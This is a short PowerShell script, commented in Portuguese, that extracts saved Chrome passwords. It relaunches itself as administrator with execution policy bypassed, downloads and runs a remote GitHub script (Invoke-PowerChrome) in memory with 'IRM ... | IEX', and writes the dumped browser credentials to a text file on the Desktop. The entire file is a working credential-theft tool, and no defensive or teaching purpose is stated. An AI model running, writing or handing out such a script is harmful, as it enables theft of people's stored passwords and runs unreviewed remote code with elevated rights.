# ExtrairSenhas.ps1
# Salva as senhas do Chrome em um arquivo .txt na Área de Trabalho

# Força a execução como administrador (se necessário)
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Define o nome do arquivo com data/hora
$datahora = Get-Date -Format "yyyyMMdd_HHmmss"
$saida = Join-Path ([Environment]::GetFolderPath("Desktop")) "senhas_chrome_$datahora.txt"

Write-Host "Carregando script do GitHub..." -ForegroundColor Cyan
IRM 'https://raw.githubusercontent.com/The-Viper-One/Invoke-PowerChrome/refs/heads/main/Invoke-PowerChrome.ps1' | IEX

Write-Host "Executando extração de senhas do Chrome..." -ForegroundColor Cyan
$output = Invoke-PowerChrome -Browser Chrome -Verbose 2>&1
$output | Out-File -FilePath $saida -Encoding UTF8

Write-Host "`n===================================================" -ForegroundColor Green
Write-Host "Pronto! Senhas salvas em: $saida" -ForegroundColor Green
Write-Host "===================================================" -ForegroundColor Green
Write-Host "`nPressione qualquer tecla para fechar..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")